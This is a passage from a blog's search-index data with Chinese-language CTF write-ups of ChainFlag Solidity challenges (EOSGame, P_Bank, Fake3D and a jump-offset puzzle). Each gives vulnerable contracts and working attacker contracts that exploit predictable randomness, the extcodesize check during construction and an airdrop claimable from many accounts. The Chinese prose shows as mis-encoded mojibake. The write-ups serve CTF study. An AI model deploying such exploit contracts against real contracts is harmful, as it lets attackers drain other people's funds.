:= mload(0x40) // å­˜å‚¨åœ¨ 96 - 128 (32 bytes) returndatacopy(ptr, 0, 0x24) // å°†è¿”å›å€¼çš„å‰36ä¸ªå­—èŠ‚æ‹·è´åˆ° memoryä¸­ï¼Œèµ·å§‹ä½ç½®ä¸º 0x40 sel := and(mload(ptr), 0xffffffff00000000000000000000000000000000000000000000000000000000) // è¯»å–æŒ‡é’ˆå32bytesçš„å€¼ï¼Œä½†æ˜¯åªä¿ç•™å‰4bytes val := mload(add(0x04, ptr)) &#125; &#125; executeè¦æ±‚ä»£ç†è°ƒç”¨executeå¤±è´¥ï¼Œä¸”è¿”å›å€¼çš„é•¿åº¦ä¸º 4 + 32 bytesï¼Œè°ƒç”¨å¤±è´¥ä¸”è‡ªå®šä¹‰è¿”å›å€¼çš„é•¿åº¦åŠå…¶å†…å®¹å¯ä»¥åšåˆ°ï¼Œä½†æ˜¯è¿™ä»ç„¶æ— æ³•æˆä¸ºownerï¼Œä½†æ˜¯ä»£ç ä¸­æœ‰ä¸ªæ¼æ´ 1234assembly &#123; mstore(func, sub(mload(func), val)) &#125;func.f(); func.f();æ‰§è¡Œè¯¥å‡½æ•°ï¼Œå…¶å®å°±æ˜¯è·³è½¬åˆ° sub(mload(func), val)ï¼Œè¿™æ€ä¹ˆç†è§£å‘¢ã€‚ æˆ‘çš„ç†è§£æ˜¯ï¼Œå‡½æ•°åœ¨åº•å±‚è¢«ç¼–è¯‘ä¸ºæ“ä½œç çš„æ—¶å€™ï¼Œä»£ç å°†ä¼šè¢«æ‹†åˆ†å­˜æ”¾ï¼Œä¸€ä¸ªä½ç½®å­˜æ”¾ä¸€æ®µä»£ç ï¼Œè€Œåœ¨æŸæŒ‡å®šç©ºé—´å†…ï¼Œå½“è°ƒç”¨æŸå‡½æ•°æ—¶ï¼Œä¼šè¯»å–å†…å­˜ä¸­çš„å€¼ï¼Œå¹¶è·³è½¬åˆ°æŒ‡å®šä½ç½®ï¼Œè€Œå½“è°ƒç”¨func.f()çš„æ—¶å€™ï¼Œå…¶è¦è·³è½¬åˆ°çš„ä½ç½®å°±æ˜¯sub(mload(func), val)è¿™ä¾¿è¦åç¼–è¯‘åˆçº¦è¯å®ã€‚ åˆçŸ¥é“ï¼Œvalçš„å€¼æ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œæ‰€ä»¥è¿›è¡Œå‡½æ•°è°ƒç”¨çš„æ—¶å€™ï¼Œå‡½æ•°å¯ä»¥è·³è½¬åˆ°ä»»æ„ä½ç½®ï¼Œè¿™å°†å–å†³äº valçš„å€¼ã€‚ åç¼–è¯‘åˆçº¦ï¼š ç¼–è¯‘é“¾æ¥ï¼šwebsite å¦‚ä¸Šå›¾è¿™æ˜¯è¦è·³è½¬çš„ä½ç½®ï¼š03c1 å¦‚ä¸Šæ˜¯payforflag()çš„æ“ä½œç  12345function payforflag() public payable onlyOwner &#123; require(msg.value == 1, &#x27;I only need a little money!&#x27;); emit SendFlag(msg.sender); selfdestruct(msg.sender);&#125; å¯¹åº”ç€ï¼š 123456Func memory func; func.f = gift; assembly &#123; mstore(func, sub(mload(func), val)) &#125; func.f(); æ­¤æ—¶å·²ç»çŸ¥é“äº†ï¼Œè¢«å‡æ•°ï¼ˆ0x048aï¼‰å’Œå·®ï¼ˆ0x03c1ï¼‰ï¼Œè¦æ±‚å‡æ•°ï¼ˆto_subï¼‰; to_sub &#x3D; 0x048a - 0x03c1 &#x3D; 1162 - 961 &#x3D; 201 &#x3D; 0xc9ï¼Œæ‰€ä»¥è®©å…¶è¿”å›å€¼ï¼Œval&#x3D;0xc9çš†å¯å®ŒæˆæŒ‘æˆ˜ã€‚ åˆå› ä¸ºï¼Œ_target.delegatecall(abi.encodeWithSelector(this.execute.selector))è¿›è¡Œå‡½æ•°ä»£ç†è°ƒç”¨çš„æ—¶å€™å¹¶æ²¡æœ‰ä¼ å‚ï¼Œæ‰€ä»¥å‡½æ•°è‚¯å®šæ˜¯ä¼šè°ƒç”¨å¤±è´¥çš„ï¼Œè€Œä¸”ç”šè‡³è¿å‡½æ•°ä½“éƒ½è¿›ä¸å»ï¼Œæ›´ä¸ç”¨è¯´è®¾ç½®è¿”å›å€¼äº†ï¼Œæ‰€ä»¥ä¾¿è¦å€ŸåŠ©å›è°ƒå‡½æ•°fallbackã€‚ å¤§ä½¬åšå®¢ï¼š linkï¼›æˆ‘åŒå­¦çš„åšå®¢ï¼šlink 3. solveæ”»å‡»åˆçº¦ 12345678910111213contract Hacker &#123; bytes4 internal constant SET = bytes4(keccak256(&#x27;fifth(uint256)&#x27;)); function() external &#123; bytes4 sel = SET; assembly &#123; mstore(0,sel) // sel: å‰4bytesæŒ‰è¦æ±‚è¿”å› mstore(4,0xc9) // val: å32bytesç”¨æ¥è‡ªå®šä¹‰è·³è½¬ä½ç½® revert(0,0x24) // å¯¼è‡´æ‰§è¡Œé”™è¯¯ï¼Œä»¥åŠè¿”å› 36bytes &#125; &#125;&#125; æ€»ç»“ ğŸ“Œ çŸ¥é“äº†å¦‚ä½•æ­å»ºcalldataï¼Œåœ¨å‡½æ•°ä½“å†…çš„msg.dataï¼Œå…¶å®æ˜¯é€šè¿‡callæ¥è°ƒç”¨å‡½æ•°æ—¶ï¼Œæ‰ä¼šæœ‰ã€‚è€Œä¸”ï¼Œåœ¨åå…­è¿›åˆ¶è¡¨ç¤ºçš„æ•°ä¸­ï¼Œä¸¤ä½æ•°å®åˆ™ä»£è¡¨ç€8ä½ã€‚æœ€é‡è¦çš„æ˜¯ï¼Œåœ¨å‡½æ•°åˆå§‹åŒ–æ—¶ï¼Œæ„é€ å™¨ä¸­å¯ä»¥è°ƒæœ¬åˆçº¦ä¸­çš„å‡½æ•°ï¼Œä½†æ˜¯åœ¨æ„é€ ä¸­ï¼Œå…¶ä»–åˆçº¦ä¸èƒ½è°ƒç”¨æœ¬åˆçº¦çš„å‡½æ•°ï¼Œä»€ä¹ˆæ„æ€å‘¢ï¼Œå°±æ˜¯æ¯”å¦‚åœ¨æ„é€ å™¨ä¸­è°ƒç”¨æœ¬åˆçº¦çš„å‡½æ•°ä¸­ï¼Œè¯¥å‡½æ•°è°ƒç”¨äº†å…¶ä»–åˆçº¦çš„å‡½æ•°æ–¹æ³•ï¼ŒåŒæ—¶å…¶ä»–åˆçº¦è¢«è°ƒç”¨çš„å‡½æ•°éœ€è¦è°ƒç”¨è°ƒç”¨è€…çš„æŸä¸ªå‡½æ•°ï¼Œå³ä½¿åˆçº¦æœ¬èº«å®ç°äº†è¯¥å‡½æ•°ï¼Œä½†æ˜¯ç”±äºåœ¨æ„é€ ingï¼Œæ‰€ä»¥å‡½æ•°å°†ä¼šè°ƒç”¨å¤±è´¥ã€‚ æƒ³è¦å˜é«˜æ‰‹é‚£å¿…ç„¶éœ€è¦æ˜¯éœ€è¦å»æ¥è§¦åº•å±‚çš„ä»£ç é€»è¾‘ï¼Œç”šè‡³æ˜¯EVMæ“ä½œç ã€‚æ‡‚å¾—äº†å‡½æ•°åœ¨åº•å±‚å¹¶ä¸æ˜¯ä¸€ä¸ªå‡½æ•°åœ¨åŒä¸€ä¸ªåœ°æ–¹ç½—åˆ—å‡ºæ¥ï¼Œè€Œæ˜¯é€šè¿‡ä¸€æ­¥æ­¥è·³è½¬å®ç°çš„ï¼Œè°ƒç”¨å‡½æ•°æ—¶ï¼Œå¯ä»¥æå‰æ”¹å˜è·³è½¬çš„ä½ç½®ï¼Œä»è€Œå®ç°æ§åˆ¶ä»£ç çš„èµ°å‘ï¼Œå¿½è§†ä¸€äº›é™åˆ¶æ¡ä»¶ã€‚ï¼ˆäºŒåˆ·ï¼šmstore(func, sub(mload(func), val))ï¼Œæˆ‘è§‰å¾—å¦‚æœå‡½æ•°æ˜¯è¿™æ ·ä¿®æ”¹çš„è¯ï¼Œæ‰§è¡Œfuncæ—¶ï¼Œåº•å±‚é€»è¾‘ä¸ºï¼šæ‰§è¡Œåˆ°å‰å››ä¸ªå­—èŠ‚ï¼Œéšåå¾€ä¸‹è¯»å–32bytesï¼Œè¿™32byteså­˜å‚¨çš„æ˜¯â€”&gt;å‡½æ•°ä½“å†…å®¹ï¼Œå®ƒå¯ä»¥æ˜¯ä¸€ä¸ªè·³è½¬åœ°å€ï¼Œå°±æ¯”å¦‚sub(mload(func), val)å­˜å‚¨çš„å°±æ˜¯funcå‡½æ•°çš„å‡½æ•°ä½“å†…å­˜ä½ç½®ï¼Œæ‰€ä»¥åªè¦æ”¹å˜è·³è½¬ä½ç½®ï¼Œå°±å¯ä»¥å®ç°è‡ªç”±æ§åˆ¶å‡½æ•°æ‰§è¡Œé€»è¾‘ï¼‰","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"bad_randomness(1)","slug":"CTFS/ChainFlag/bad_randomness/bad_randomness","date":"2023-08-22T02:50:10.000Z","updated":"2023-08-22T02:50:10.000Z","comments":true,"path":"2023/08/22/CTFS/ChainFlag/bad_randomness/bad_randomness/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/22/CTFS/ChainFlag/bad_randomness/bad_randomness/","excerpt":"","text":"EOSGame1. questionæºç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161/** *Submitted for verification at Etherscan.io on 2018-11-26*/pragma solidity ^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath &#123; /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the // benefit is lost if &#x27;b&#x27; is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b); return c; &#125; /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold return c; &#125; /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a); return c; &#125; /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b != 0); return a % b; &#125;&#125;contract EOSToken&#123; using SafeMath for uint256; string TokenName = &quot;EOS&quot;; uint256 totalSupply = 100**18; address owner; mapping(address =&gt; uint256) balances; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; constructor() public&#123; owner = msg.sender; balances[owner] = totalSupply; &#125; function mint(address _to,uint256 _amount) public onlyOwner &#123; require(_amount &lt; totalSupply); totalSupply = totalSupply.sub(_amount); balances[_to] = balances[_to].add(_amount); &#125; function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123; require(_amount &lt; balances[_from]); balances[_from] = balances[_from].sub(_amount); balances[_to] = balances[_to].add(_amount); &#125; function eosOf(address _who) public constant returns(uint256)&#123; return balances[_who]; &#125;&#125;contract EOSGame&#123; using SafeMath for uint256; mapping(address =&gt; uint256) public bet_count; uint256 FUND = 100; uint256 MOD_NUM = 20; uint256 POWER = 100; uint256 SMALL_CHIP = 1; uint256 BIG_CHIP = 20; EOSToken eos; event FLAG(string b64email, string slogan); constructor() public&#123; eos=new EOSToken(); &#125; function initFund() public&#123; if(bet_count[tx.origin] == 0)&#123; bet_count[tx.origin] = 1; eos.mint(tx.origin, FUND); &#125; &#125; function bet(uint256 chip) internal &#123; bet_count[tx.origin] = bet_count[tx.origin].add(1); uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin]))); uint256 lucky = lucky_hash % MOD_NUM; if (shark == lucky)&#123; eos.transfer(address(this), tx.origin, chip.mul(POWER)); &#125; &#125; function smallBlind() public &#123; eos.transfer(tx.origin, address(this), SMALL_CHIP); bet(SMALL_CHIP); &#125; function bigBlind() public &#123; eos.transfer(tx.origin, address(this), BIG_CHIP); bet(BIG_CHIP); &#125; function eosBlanceOf() public view returns(uint256) &#123; return eos.eosOf(tx.origin); &#125; function CaptureTheFlag(string b64email) public&#123; require (eos.eosOf(tx.origin) &gt; 18888); emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;); &#125;&#125; ğŸ“Œ æˆåŠŸè°ƒç”¨CaptureTheFlag()ã€‚ 2. analysis è€é—®é¢˜äº†ï¼Œåœ¨bet()å‡½æ•°ä¸­ï¼Œå‡½æ•°ä½“ä¸­çš„å€¼å¯ä»¥æå‰è®¡ç®—ï¼Œå¹¶ä¸”æ¯æ¬¡è°ƒç”¨æ­¤å‡½æ•°ï¼ŒèµŒåšæ¬¡æ•°bet_countå°±ä¼šåŠ ä¸€ï¼Œä»¥æ­¤æ¥æ§åˆ¶ä¸èƒ½å†ä¸€ç¬”äº¤æ˜“ä¸­å®Œæˆæ”»å‡»ï¼Œä½†ï¼Œå¯ä»¥è¿›è¡Œæ— æ•°æ¬¡çš„æ”»å‡»ï¼Œå½“ç„¶ï¼Œä½ è¶³å¤Ÿæœ‰é’±çš„è¯ã€‚ åœ¨æ”»å‡»åˆçº¦ä¸­ï¼Œè®¾ç½®ä¸€ä¸ªè‡ªå¢çš„å…¨å±€å˜é‡ï¼Œå¯ä»¥è¾…ç»„è®¡ç®—ã€‚ è®¡ç®—ä»£ç ï¼š 123456789bet_counter++;uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));uint256 shark = seed_hash % MOD_NUM;uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_counter)));uint256 lucky = lucky_hash % MOD_NUM;require(shark == lucky, &quot;shark != luck, try again...&quot;); 3. solveéƒ¨ç½²åˆçº¦ä¹‹åï¼Œå¤šæ¬¡è°ƒç”¨attack()å‡½æ•°ï¼Œç›´åˆ°è°ƒç”¨è€…çš„ä½™é¢å¤§äº18888ä¸ºæ­¢ï¼Œæ²¡åŠæ³•ï¼Œæ”»å‡»éœ€è¦æ”»å‡»å¾ˆå¤šæ¬¡ï¼Œå¤§éƒ¨åˆ†éƒ½æ˜¯ä¼šæŠ¥é”™ï¼Œæ¯•ç«Ÿæ¯ä¸€æ¬¡æ”»å‡»åªæœ‰1/20çš„æ¦‚ç‡æˆåŠŸã€‚ æ”»å‡»åˆçº¦ 12345678910111213141516171819202122232425262728293031contract Hacker &#123; EOSGame game; uint256 MOD_NUM = 20; uint bet_counter = 1; constructor(address _game) public &#123; game = EOSGame(_game); // ç±»ä¼¼ç©ºæŠ•ï¼Œè·å– 100 tokens game.initFund(); &#125; function attack() public &#123; bet_counter++; uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp))); uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed))); uint256 shark = seed_hash % MOD_NUM; uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_counter))); uint256 lucky = lucky_hash % MOD_NUM; require(shark == lucky, &quot;shark != luck, try again...&quot;); game.bigBlind(); &#125; function isComplete() public &#123; game.CaptureTheFlag(&quot;hacker&quot;); &#125;&#125; æ€»ç»“ è¿™é“é¢˜è€ƒå¯Ÿçš„æ˜¯éšæœºæ•°çš„æ§åˆ¶ï¼Œè¿˜ç®—æ¯”è¾ƒç®€å•ã€‚","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"}]},{"title":"airdrop_hunting(3)","slug":"CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)","date":"2023-08-21T08:50:10.000Z","updated":"2023-08-21T08:50:10.000Z","comments":true,"path":"2023/08/21/CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)/","link":"","permalink":"https://biyouqiuqiu.com/2023/08/21/CTFS/ChainFlag/airdrop_hunting/airdrop_hunting(3)/","excerpt":"","text":"CoinFlip1. questionæºç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990pragma solidity ^0.4.24;contract P_Bank&#123; mapping (address =&gt; uint) public balances; uint public MinDeposit = 0.1 ether; Log TransferLog; event FLAG(string b64email, string slogan); constructor(address _log) public &#123; TransferLog = Log(_log); &#125; function Ap() public &#123; if(balances[msg.sender] == 0) &#123; balances[msg.sender]+=1 ether; &#125; &#125; function Transfer(address to, uint val) public &#123; if(val &gt; balances[msg.sender]) &#123; revert(); &#125; balances[to]+=val; balances[msg.sender]-=val; &#125; function CaptureTheFlag(string b64email) public returns(bool)&#123; require (balances[msg.sender] &gt; 500 ether); emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;); &#125; function Deposit() public payable &#123; if(msg.value &gt; MinDeposit) &#123; balances[msg.sender]+= msg.value; TransferLog.AddMessage(msg.sender,msg.value,&quot;Deposit&quot;); &#125; &#125; function CashOut(uint _am) public &#123; if(_am&lt;=balances[msg.sender]) &#123; if(msg.sender.call.value(_am)()) &#123; balances[msg.sender]-=_am; TransferLog.AddMessage(msg.sender,_am,&quot;CashOut&quot;); &#125; &#125; &#125; function() public payable&#123;&#125; &#125;contract Log &#123; struct Message &#123; address Sender; string Data; uint Val; uint Time; &#125; string err = &quot;CashOut&quot;; Message[] public History; Message LastMsg; function AddMessage(address _adr,uint _val,string _data) public &#123; LastMsg.Sender = _adr; LastMsg.Time = now; LastMsg.Val = _val; LastMsg.Data = _data; History.push(LastMsg); &#125;&#125; ğŸ“Œ ç›®æ ‡ï¼šæˆåŠŸè°ƒç”¨CaptureTheFlag() 2. analysis æ¯”è¾ƒç®€å•ï¼Œæ³¨æ„åˆ°ç©ºæŠ•å‡½æ•°AP()ï¼Œå…¶è¦æ±‚è°ƒç”¨è€…çš„ä½™é¢balanceå°äº1etherå³å¯è°ƒç”¨ï¼Œä½†æ˜¯å¦‚æœæŸäººæ‹¥æœ‰ä¸¤ä¸ªè´¦æˆ·ï¼Œé‚£ä¾¿å¯ä»¥æ— é™å–é’±äº†ã€‚ 3. solveæ”»å‡»åˆçº¦ï¼š 1234567891011121314151617181920212223242526272829303132333435contract Helper &#123; address hacker; P_Bank bank; constructor(address _bank) public &#123; hacker = msg.sender; bank = P_Bank(_bank); &#125; function attack() public &#123; bank.Ap(); bank.Transfer(hacker, 1 ether); &#125;&#125;contract Hacker &#123; P_Bank bank; Helper helper; constructor(address _bank) public &#123; bank = P_Bank(_bank); helper = new Helper(_bank); &#125; function attack() public &#123; for (uint i; i &lt; 501; i++) &#123; helper.attack(); &#125; // CaptureTheFlag() æˆåŠŸæ‰§è¡Œä¹‹åï¼Œé»˜è®¤è¿”å›false require(!bank.CaptureTheFlag(&quot;&quot;), &quot;you don&#x27;t capture...&quot;); &#125;&#125; ğŸ“Œ æ³¨æ„ï¼šè°ƒç”¨Hacker.attack()æ—¶ï¼Œéœ€è¦å°†gaslimitè°ƒé«˜ æ”»å‡»æˆåŠŸï¼š Fake3d1. question123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138/** *Submitted for verification at Etherscan.io on 2018-11-27*/pragma solidity ^0.4.24;/** * @title SafeMath * @dev Math operations with safety checks that revert on error */library SafeMath &#123; /** * @dev Multiplies two numbers, reverts on overflow. */ function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; // Gas optimization: this is cheaper than requiring &#x27;a&#x27; not being zero, but the // benefit is lost if &#x27;b&#x27; is also tested. // See: https://github.com/OpenZeppelin/openzeppelin-solidity/pull/522 if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b); return c; &#125; /** * @dev Integer division of two numbers truncating the quotient, reverts on division by zero. */ function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); // Solidity only automatically asserts when dividing by 0 uint256 c = a / b; // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold return c; &#125; /** * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend). */ function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; /** * @dev Adds two numbers, reverts on overflow. */ function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a); return c; &#125; /** * @dev Divides two numbers and returns the remainder (unsigned integer modulo), * reverts when dividing by zero. */ function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b != 0); return a % b; &#125;&#125;contract WinnerList&#123; address owner; struct Richman&#123; address who; uint balance; &#125; function note(address _addr, uint _value) public&#123; Richman rm; rm.who = _addr; rm.balance = _value; &#125; &#125;contract Fake3D &#123; using SafeMath for *; mapping(address =&gt; uint256) public balance; uint public totalSupply = 10**18; WinnerList wlist; event FLAG(string b64email, string slogan); constructor(address _addr) public&#123; wlist = WinnerList(_addr); &#125; modifier turingTest() &#123; address _addr = msg.sender; uint256 _codeLength; assembly &#123;_codeLength := extcodesize(_addr)&#125; require(_codeLength == 0, &quot;sorry humans only&quot;); _; &#125; function transfer(address _to, uint256 _amount) public&#123; require(balance[msg.sender] &gt;= _amount); balance[msg.sender] = balance[msg.sender].sub(_amount); balance[_to] = balance[_to].add(_amount); &#125; function airDrop() public turingTest returns (bool) &#123; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123; balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; &#125; else return false; &#125; function CaptureTheFlag(string b64email) public&#123; require (balance[msg.sender] &gt; 8888); wlist.note(msg.sender,balance[msg.sender]); emit FLAG(b64email, &quot;Congratulations to capture the flag?&quot;); &#125;&#125; ğŸ“Œ ç›®æ ‡ï¼šæˆåŠŸè°ƒç”¨CaptureTheFlag() 2. analysis è¿™é¢˜å˜›ï¼Œæ€è·¯ä¸éš¾ï¼Œå°±æ˜¯éº»çƒ¦ã€‚ è¦æƒ³æˆåŠŸè°ƒç”¨CaptureTheFlag()ï¼Œè°ƒç”¨è€…çš„balanceå¿…é¡»å¤§äº 8888ï¼Œè€Œèƒ½è·å–balanceå‡½æ•°ä¸ºairDrop()ï¼Œä½†æ˜¯å…¶è¢«ä¸€ä¸ªä¿®é¥°å™¨é™åˆ¶ã€‚ ä¿®é¥°å™¨ï¼š 1234567modifier turingTest() &#123; address _addr = msg.sender; uint256 _codeLength; assembly &#123;_codeLength := extcodesize(_addr)&#125; require(_codeLength == 0, &quot;sorry humans only&quot;); _;&#125; ä¿®é¥°å™¨è§„å®šï¼Œè°ƒç”¨è€…åœ°å€çš„ä»£ç å¤§å°ä¸º0ï¼Œå³è¦æ±‚è°ƒç”¨è€…ä¸ºEOAè´¦æˆ·ï¼Œä½†æ˜¯ä¹Ÿä¸å…¨æ˜¯ï¼Œè¿˜æœ‰ä¸€ç§æ“ä½œä¹Ÿå¯ä»¥è®©å…¶ä»£ç å¤§å°ä¸º0ï¼Œåœ¨æ„é€ å‡½æ•°è°ƒç”¨è¢«æ­¤ä¿®é¥°å™¨çš„å‡½æ•°æ—¶ï¼Œåˆçº¦è¿˜åœ¨åˆå§‹åŒ–ï¼Œé€šè¿‡extcodesizeè·å–åˆ°çš„ä»£ç å¤§å°ä¸º0ï¼Œè¿™æ ·ä¸€æ¥å°±æœ‰è·¯å­äº†ã€‚ å†åˆ†æairDrop(): 123456789101112131415161718function airDrop() public turingTest returns (bool) &#123; uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); if((seed - ((seed / 1000) * 1000)) &lt; 288)&#123; balance[tx.origin] = balance[tx.origin].add(10); totalSupply = totalSupply.sub(10); return true; &#125; else return false;&#125; æ ¹æ®åŒºå—é“¾ä¿¡æ¯ï¼Œè®¡ç®—å‡ºç§å­ï¼Œå½“ç„¶ï¼Œè¿™äº›å…¨å±€å˜é‡block.timestampï¼Œblock.difficultyï¼Œblock.coinbaseï¼Œblock.gaslimitï¼Œnowï¼Œå†åŒä¸€ä¸ªåŒºå—ä¸­ä»–ä»¬çš„å€¼æ˜¯ç›¸åŒçš„ï¼Œä¹Ÿå°±æ„å‘³ç€ï¼Œå¯ä»¥äº‹å…ˆè®¡ç®—å‡ºç§å­seedï¼Œå³åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­ï¼Œå¯ä»¥å…ˆè®¡ç®—å‡ºç§å­ï¼Œå†è°ƒç”¨æ­¤å‡½æ•°ï¼Œå…¶ç”Ÿæˆçš„seedç›¸åŒã€‚ ç”±äºgasä¸è¶³å¼•èµ·çš„é”™è¯¯çš„ä»£ç ï¼š 123456789101112131415161718192021222324252627contract Hacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(address(this))))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the seed bigger than 288, please try again...&quot;); for (uint i; i &lt; 889; i++) &#123; fake.airDrop(); &#125; fake.CaptureTheFlag(&quot;&quot;); &#125;&#125; å°½ç®¡ï¼Œæˆ‘å·²ç»å°†gaslimitè®¾ç½®åˆ°äº†ï¼š3000000000 æŒ‰ç†æ¥è¯´ï¼ŒæŒ‰ç…§è¿™ä¸ªæ€è·¯ï¼Œæ”»å‡»åˆçº¦å·²ç»å‡ºæ¥äº†ï¼Œä½†æ˜¯ï¼Œç”±äºæ¶‰åŠçš„balanceæ•°ç›®å¤ªå¤§ï¼Œåœ¨å•ç¬”äº¤æ˜“ä¸­æ— æ³•æ­£å¸¸æ‰§è¡Œï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡å¤šæ¬¡éƒ¨ç½²åˆçº¦è·å–ç©ºæŠ•ï¼Œåˆå› ä¸ºç©ºæŠ•é›†ä¸­å‘æ”¾ç»™tx.originï¼Œåˆ°è¯¥è´¦æˆ·çš„balanceå¤§äº8888æ—¶ï¼Œéœ€è¦tx.originäº²è‡ªå»è°ƒç”¨CaptureTheFlag()ã€‚ 3. solveä¸€ç›´éƒ¨ç½²è¯¥åˆçº¦ï¼Œç›´åˆ°æˆåŠŸéƒ¨ç½²åæ¬¡ä¸ºæ­¢ 123456789101112131415161718192021222324252627contract Hacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(address(this))))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the seed bigger than 288, please try again...&quot;); for (uint i; i &lt; 90; i++) &#123; fake.airDrop(); &#125; &#125;&#125; å¦‚å›¾ï¼š å…¶å®å½“åˆçš„åšæ³•è¿˜æ˜¯æœ‰ç‚¹ç¹çäº†ï¼Œä¹Ÿä¸çŸ¥é“æ˜¯ä¸æ˜¯ç§‘æŠ€è¿›æ­¥äº†å…¶å®æ˜¯å¯ä»¥ä¸€æ¬¡æ€§å®Œæˆçš„ï¼Œåªè¦æˆåŠŸéƒ¨ç½²å¦‚ä¸‹åˆçº¦å³å¯ 1234567891011121314151617181920212223242526contract Fake3DHacker &#123; using SafeMath for *; Fake3D fake; constructor(address _fake) public &#123; fake = Fake3D(_fake); uint256 seed = uint256(keccak256(abi.encodePacked( (block.timestamp).add (block.difficulty).add ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add (block.gaslimit).add ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add (block.number) ))); require((seed - ((seed / 1000) * 1000)) &lt; 288, &quot;the result of the calculation is not less than 288&quot;); for(uint 